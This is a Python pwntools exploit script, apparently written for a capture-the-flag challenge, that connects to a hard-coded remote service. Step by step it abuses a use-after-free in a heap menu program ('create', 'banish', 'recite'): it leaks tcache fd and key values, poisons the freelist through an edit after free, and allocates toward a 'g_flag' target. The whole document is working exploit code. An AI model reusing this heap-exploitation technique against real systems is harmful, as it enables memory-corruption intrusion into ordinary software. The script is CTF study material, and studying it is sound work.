#!/usr/bin/env python3
from pwn import *
import sys

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def recvmenu(p):
    return p.recvuntil(b'> ')

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def edit(p, idx, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    if isinstance(data, str):
        data = data.encode()
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = p.recv(size)
    p.recv(1)  # consume trailing newline
    return data

p = connect()
banner = recvmenu(p)
print("=== BANNER ===")
print(banner.decode(errors='replace'))

# Step 1: Create spell 0 with size 0x80
print("\n=== Step 1: Create spell 0 (size 0x80) ===")
create(p, 0, 0x80, b'A' * 0x7f + b'\n')
data = recite(p, 0, 0x80)
print(f"Spell 0 data[:16]: {data[:16].hex()}")

# Step 2: Banish spell 0
print("\n=== Step 2: Banish spell 0 ===")
banish(p, 0)

# Step 3: Read spell 0 (UAF) - get fd pointer
print("\n=== Step 3: Read spell 0 (UAF) ===")
data = recite(p, 0, 0x80)
fd = u64(data[0:8])
key = u64(data[8:16])
print(f"fd  = {hex(fd)}")
print(f"key = {hex(key)}")

# Step 4: Create spell 1 (size 0x80) - should return spell 0's address
print("\n=== Step 4: Create spell 1 (size 0x80) ===")
create(p, 1, 0x80, b'B' * 0x7f + b'\n')

# Step 5: Verify - recite spell 0 should show spell 1's data
print("\n=== Step 5: Verify UAF - recite spell 0 ===")
data = recite(p, 0, 0x80)
print(f"Spell 0 data[:16]: {data[:16].hex()}")
if data[:16] == b'B' * 16:
    print("  -> UAF confirmed: spell 0 points to spell 1's buffer")
else:
    print("  -> UAF not working as expected")

# Step 6: Banish spell 1
print("\n=== Step 6: Banish spell 1 ===")
banish(p, 1)

# Step 7: Read spell 1 (UAF) - get fd pointer
print("\n=== Step 7: Read spell 1 (UAF) ===")
data = recite(p, 1, 0x80)
fd2 = u64(data[0:8])
key2 = u64(data[8:16])
print(f"fd  = {hex(fd2)}")
print(f"key = {hex(key2)}")
print(f"fd matches: {fd == fd2}")

# Step 8: Edit spell 1 (UAF write) - write fd to fd field
print("\n=== Step 8: Edit spell 1 (UAF write) ===")
payload = p64(fd) + b'\n'
print(f"Writing payload: {payload.hex()}")
edit(p, 1, payload)

# Step 9: Create spell 2 (size 0x80) - returns spell 1's address
print("\n=== Step 9: Create spell 2 (size 0x80) ===")
create(p, 2, 0x80, b'C' * 0x7f + b'\n')

# Step 10: Create spell 3 (size 0x80) - returns fd (hopefully g_flag)
print("\n=== Step 10: Create spell 3 (size 0x80) ===")
create(p, 3, 0x80, b'D' * 0x7f + b'\n')

# Step 11: Read spell 3 - see what's there
print("\n=== Step 11: Read spell 3 ===")
data = recite(p, 3, 0x80)
print(f"Spell 3 data (hex): {data.hex()}")
print(f"Spell 3 data (ascii): {data}")

# Also try reading spell 0 and 1 to see if they point to the same place
print("\n=== Bonus: Read spell 0 (UAF) ===")
data = recite(p, 0, 0x80)
print(f"Spell 0 data[:16]: {data[:16].hex()}")

p.sendline(b'0')
p.close()
